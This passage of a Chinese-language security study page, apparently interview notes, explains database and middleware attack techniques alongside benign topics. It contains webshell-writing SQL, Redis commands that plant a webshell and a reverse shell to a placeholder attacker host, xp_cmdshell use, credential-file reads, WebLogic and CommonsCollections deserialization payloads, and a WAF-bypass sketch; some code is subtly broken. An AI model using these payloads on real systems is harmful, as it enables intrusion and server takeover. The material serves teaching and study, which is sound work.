<li>文件不能已存在。</li>
</ul>
</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/file.txt&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>LOAD DATA INFILE</strong>：</p>
<ul>
<li>用于从文件中加载数据到表中。</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">&#x27;/var/www/html/file.txt&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> <span class="keyword">table</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="MySQL-提权"><a href="#MySQL-提权" class="headerlink" title="MySQL 提权"></a>MySQL 提权</h3><ol>
<li><p><strong>通过写文件提权</strong>：</p>
<ul>
<li>使用 <code>INTO OUTFILE</code> 或 <code>LOAD DATA INFILE</code> 写入 Webshell。</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>利用 MySQL 用户权限</strong>：</p>
<ul>
<li>如果 MySQL 用户有 <code>FILE</code> 权限，可以写入文件到 Web 目录。</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="SQL-Server-除了-SQL-注入外的渗透方式"><a href="#SQL-Server-除了-SQL-注入外的渗透方式" class="headerlink" title="SQL Server 除了 SQL 注入外的渗透方式"></a>SQL Server 除了 SQL 注入外的渗透方式</h3><ol>
<li><p><strong>存储过程</strong>：</p>
<ul>
<li>利用存储过程执行系统命令。</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;dir C:\&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>权限滥用</strong>：</p>
<ul>
<li>利用高权限用户执行恶意操作。</li>
<li>示例：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_addlogin <span class="string">&#x27;newuser&#x27;</span>, <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>中间件漏洞</strong>：</p>
<ul>
<li>利用中间件如 PHP、Java 的漏洞进行渗透。</li>
</ul>
</li>
</ol>
<h3 id="Redis-主从复制漏洞"><a href="#Redis-主从复制漏洞" class="headerlink" title="Redis 主从复制漏洞"></a>Redis 主从复制漏洞</h3><ol>
<li><p><strong>主从复制</strong>：</p>
<ul>
<li>攻击者可以配置一个 Redis 从节点，连接到目标 Redis 服务器，获取数据。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 slaveof attacker_host 6379</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>RCE</strong>：</p>
<ul>
<li>通过 Redis 配置文件写入恶意内容，触发 RCE。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 CONFIG SET <span class="built_in">dir</span> /var/www/html</span><br><span class="line">redis-cli -h target_host -p 6379 CONFIG SET dbfilename shell.php</span><br><span class="line">redis-cli -h target_host -p 6379 SET shell.php <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Redis-未授权访问如何获得服务器权限"><a href="#Redis-未授权访问如何获得服务器权限" class="headerlink" title="Redis 未授权访问如何获得服务器权限"></a>Redis 未授权访问如何获得服务器权限</h3><ol>
<li><p><strong>写入 Webshell</strong>：</p>
<ul>
<li>通过 Redis 写入 Webshell 到 Web 目录。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 CONFIG SET <span class="built_in">dir</span> /var/www/html</span><br><span class="line">redis-cli -h target_host -p 6379 CONFIG SET dbfilename shell.php</span><br><span class="line">redis-cli -h target_host -p 6379 SET shell.php <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>反弹 shell</strong>：</p>
<ul>
<li>利用 Redis 写入反弹 shell 的脚本。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 SET shell.php <span class="string">&quot;&lt;?php exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/attacker_ip/attacker_port 0&gt;&amp;1\&quot;&#x27;); ?&gt;&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="任意文件读取，一般读取什么类型的文件"><a href="#任意文件读取，一般读取什么类型的文件" class="headerlink" title="任意文件读取，一般读取什么类型的文件"></a>任意文件读取，一般读取什么类型的文件</h3><ol>
<li><p><strong>敏感配置文件</strong>：</p>
<ul>
<li><code>/etc/passwd</code>、<code>/etc/shadow</code>、<code>/etc/hosts</code>。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Web 配置文件</strong>：</p>
<ul>
<li><code>/etc/nginx/nginx.conf</code>、<code>/etc/apache2/apache2.conf</code>。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>应用配置文件</strong>：</p>
<ul>
<li><code>web.config</code>、<code>application.properties</code>。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/web.config</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="如何通过文件读取获取到-Web-的绝对路径"><a href="#如何通过文件读取获取到-Web-的绝对路径" class="headerlink" title="如何通过文件读取获取到 Web 的绝对路径"></a>如何通过文件读取获取到 Web 的绝对路径</h3><ol>
<li><p><strong>读取 Web 配置文件</strong>：</p>
<ul>
<li>通过读取 <code>/etc/nginx/nginx.conf</code> 或 <code>/etc/apache2/apache2.conf</code> 获取 Web 根目录。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/nginx/nginx.conf | grep root</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>读取 Web 应用文件</strong>：</p>
<ul>
<li>通过读取 Web 应用的配置文件获取绝对路径。</li>
<li>示例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/web.config | grep path</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="etc-passwd-文件内容"><a href="#etc-passwd-文件内容" class="headerlink" title="&#x2F;etc&#x2F;passwd 文件内容"></a>&#x2F;etc&#x2F;passwd 文件内容</h3><p><code>/etc/passwd</code> 文件包含系统中所有用户的信息，每个用户占一行，字段之间用冒号分隔。文件格式如下：</p>
<ul>
<li><strong>用户名</strong>：用户的登录名。</li>
<li><strong>密码</strong>：早期系统中存放加密后的密码，现代系统中通常为 <code>x</code>，表示密码存放在 <code>/etc/shadow</code> 中。</li>
<li>**用户 ID (UID)**：用户的唯一标识符。</li>
<li>**组 ID (GID)**：用户所属组的唯一标识符。</li>
<li><strong>用户描述</strong>：用户的真实姓名或描述信息。</li>
<li><strong>主目录</strong>：用户的登录目录。</li>
<li><strong>登录 shell</strong>：用户登录时启动的 shell。</li>
</ul>
<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>

<h3 id="正向代理和反向代理的区别"><a href="#正向代理和反向代理的区别" class="headerlink" title="正向代理和反向代理的区别"></a>正向代理和反向代理的区别</h3><ol>
<li><p><strong>正向代理</strong>：</p>
<ul>
<li><strong>定义</strong>：正向代理是一个位于客户端和目标服务器之间的中间服务器，用于代理客户端的请求。</li>
<li><strong>工作方式</strong>：客户端配置代理服务器地址，代理服务器向目标服务器转发请求并返回响应。</li>
<li><strong>应用场景</strong>：用于隐藏客户端真实 IP，访问受限资源，或进行请求过滤。</li>
</ul>
</li>
<li><p><strong>反向代理</strong>：</p>
<ul>
<li><strong>定义</strong>：反向代理是一个位于服务器端的中间服务器，用于代理服务器的响应。</li>
<li><strong>工作方式</strong>：客户端直接访问代理服务器，代理服务器向后端服务器转发请求并返回响应。</li>
<li><strong>应用场景</strong>：用于负载均衡、缓存、SSL 终止、隐藏后端服务器真实 IP 等。</li>
</ul>
</li>
</ol>
<h3 id="Python-是否是真正的多线程"><a href="#Python-是否是真正的多线程" class="headerlink" title="Python 是否是真正的多线程"></a>Python 是否是真正的多线程</h3><p>Python 的多线程由于全局解释器锁（GIL）的存在，并不是真正的多线程。GIL 机制确保同一时刻只有一个线程在解释器中执行，因此在 CPU 密集型任务中，Python 的多线程并不能充分利用多核 CPU。</p>
<h4 id="示例代码：-5"><a href="#示例代码：-5" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_bound_task</span>():</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">        <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Sum: <span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    t = threading.Thread(target=cpu_bound_task)</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>

<h3 id="和信息安全相关的-HTTP-响应头"><a href="#和信息安全相关的-HTTP-响应头" class="headerlink" title="和信息安全相关的 HTTP 响应头"></a>和信息安全相关的 HTTP 响应头</h3><ol>
<li><p><strong>Strict-Transport-Security</strong>：</p>
<ul>
<li>强制浏览器使用 HTTPS 访问网站。</li>
<li>示例：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Strict-Transport-Security</span><span class="punctuation">: </span>max-age=31536000; includeSubDomains</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>X-Frame-Options</strong>：</p>
<ul>
<li>防止点击劫持。</li>
<li>示例：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>X-XSS-Protection</strong>：</p>
<ul>
<li>启用或禁用 XSS 保护。</li>
<li>示例：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1; mode=block</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>X-Content-Type-Options</strong>：</p>
<ul>
<li>禁用 MIME 类型嗅探。</li>
<li>示例：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Content-Security-Policy</strong>：</p>
<ul>
<li>定义页面可以加载哪些资源。</li>
<li>示例：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="WebLogic-反序列化原理"><a href="#WebLogic-反序列化原理" class="headerlink" title="WebLogic 反序列化原理"></a>WebLogic 反序列化原理</h3><ol>
<li><p><strong>XML 反序列化漏洞</strong>：</p>
<ul>
<li>WebLogic 的 XML 反序列化存在漏洞，攻击者可以构造恶意 XML 数据，导致远程代码执行。</li>
<li>示例：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch /tmp/hacked<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>后台文件上传漏洞</strong>：</p>
<ul>
<li>攻击者可以通过后台文件上传功能上传恶意文件（如 Webshell），从而获取服务器权限。</li>
</ul>
</li>
<li><p><strong>二次 URLDecode 权限绕过</strong>：</p>
<ul>
<li>攻击者可以通过二次 URL 编码绕过输入验证，访问受限资源。</li>
</ul>
</li>
</ol>
<h3 id="内存马相关原理"><a href="#内存马相关原理" class="headerlink" title="内存马相关原理"></a>内存马相关原理</h3><p>内存马是一种驻留在内存中的恶意代码，通常通过反序列化漏洞或其他内存操作漏洞注入。内存马不会写入磁盘，因此难以被传统防病毒软件检测到。</p>
<h4 id="示例代码：-6"><a href="#示例代码：-6" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java 内存马示例</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryHorse</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Runnable horse;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MemoryHorse</span><span class="params">(Runnable horse)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.horse = horse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span> (horse != <span class="literal">null</span>) &#123;</span><br><span class="line">            horse.run();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Shiro-反序列化漏洞利用时的-WAF-绕过"><a href="#Shiro-反序列化漏洞利用时的-WAF-绕过" class="headerlink" title="Shiro 反序列化漏洞利用时的 WAF 绕过"></a>Shiro 反序列化漏洞利用时的 WAF 绕过</h3><ol>
<li><p><strong>更换 HTTP 头</strong>：</p>
<ul>
<li>如果 WAF 拦截了特定的 HTTP 头，可以尝试使用其他头传递数据。</li>
</ul>
</li>
<li><p><strong>将 loader 写入 Cookie</strong>：</p>
<ul>
<li>将 loader 代码写入 Cookie，避免 HTTP 头过长的问题。</li>
</ul>
</li>
<li><p><strong>将 shellcode 写入请求体</strong>：</p>
<ul>
<li>将 shellcode 放在请求体中，避免 HTTP 头长度限制。</li>
</ul>
</li>
</ol>
<h4 id="示例代码：-7"><a href="#示例代码：-7" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 loader 写入 Cookie</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;loader&#x27;</span>: <span class="string">&#x27;Base64 encoded loader code&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 shellcode 写入请求体</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;shellcode&#x27;</span>: <span class="string">&#x27;Base64 encoded shellcode&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">&#x27;http://target.com/vulnerable&#x27;</span>, cookies=cookies, data=data)</span><br></pre></td></tr></table></figure>

<h3 id="ysoserial-原理和-CommonCollections-利用链"><a href="#ysoserial-原理和-CommonCollections-利用链" class="headerlink" title="ysoserial 原理和 CommonCollections 利用链"></a>ysoserial 原理和 CommonCollections 利用链</h3><ol>
<li><p><strong>ysoserial</strong>：</p>
<ul>
<li>ysoserial 是一个用于生成 Java 反序列化漏洞利用链的工具。</li>
<li>它利用了 Java 类库中的 gadgets 构造反序列化链。</li>
</ul>
</li>
<li><p><strong>CommonCollections 利用链</strong>：</p>
<ul>
<li><strong>CC1</strong>：利用 <code>InvokerTransformer</code> 和 <code>LazyMap</code> 构造恶意链。</li>
<li><strong>CC2</strong>：利用 <code>ConstructorConstructor</code> 和 <code>TransformingClassLoader</code> 构造恶意链。</li>
<li><strong>CC3</strong>：利用 <code>ChainedTransformer</code> 和 <code>LazyMap</code> 构造恶意链。</li>
</ul>
</li>
</ol>
<h4 id="示例代码：-8"><a href="#示例代码：-8" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 ysoserial 生成 payload</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;touch /tmp/hacked&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        transformers[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        transformers[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        transformers[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        transformers[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;command&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        outerMap.put(<span class="string">&quot;value&quot;</span>, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> TiedMapEntry.class.getDeclaredConstructor(Map.class, Object.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> constructor.newInstance(outerMap, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(entry);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Java、PHP、Python-反序列化的区别和相同点"><a href="#Java、PHP、Python-反序列化的区别和相同点" class="headerlink" title="Java、PHP、Python 反序列化的区别和相同点"></a>Java、PHP、Python 反序列化的区别和相同点</h3><h4 id="Java-反序列化"><a href="#Java-反序列化" class="headerlink" title="Java 反序列化"></a>Java 反序列化</h4><ul>
<li><strong>需要利用链</strong>：Java 反序列化通常需要利用反序列化链来触发漏洞。反序列化链是指通过一系列的类和方法调用，最终实现恶意代码的执行。</li>
<li><strong>示例</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaDeserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;malicious.ser&quot;</span>))) &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h4><ul>
<li><strong>需要利用链</strong>：PHP 反序列化同样需要利用反序列化链来触发漏洞。通过 <code>__wakeup</code> 或 <code>__destruct</code> 魔术方法来执行恶意代码。</li>
<li><strong>示例</strong>：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaliciousClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialized</span> = <span 